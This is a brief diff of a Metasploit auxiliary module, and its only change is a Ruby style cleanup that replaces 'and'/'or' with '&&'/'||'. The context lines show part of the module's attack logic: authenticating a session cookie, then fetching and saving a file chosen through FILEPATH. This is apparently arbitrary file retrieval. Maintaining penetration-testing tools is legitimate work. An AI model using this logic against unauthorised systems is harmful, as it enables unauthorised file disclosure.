@@ -103,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'GET'
       )
 
-      if res and res.code == 500
+      if res && res.code == 500
         return jsession
       end
     end
@@ -138,7 +138,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    if jsession or noauth
+    if jsession || noauth
       print_good("#{peer} - Successfully authenticated our JSESSIONID cookie")
     else
       fail_with(Failure::Unknown, "#{peer} - Failed to authenticate JSESSIONID cookie")
@@ -153,7 +153,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    if res and res.code == 200 and res.body.length > 0
+    if res && res.code == 200 && res.body.length > 0
       filedata = res.body
       vprint_line(filedata.to_s)
       fname = File.basename(datastore['FILEPATH'])
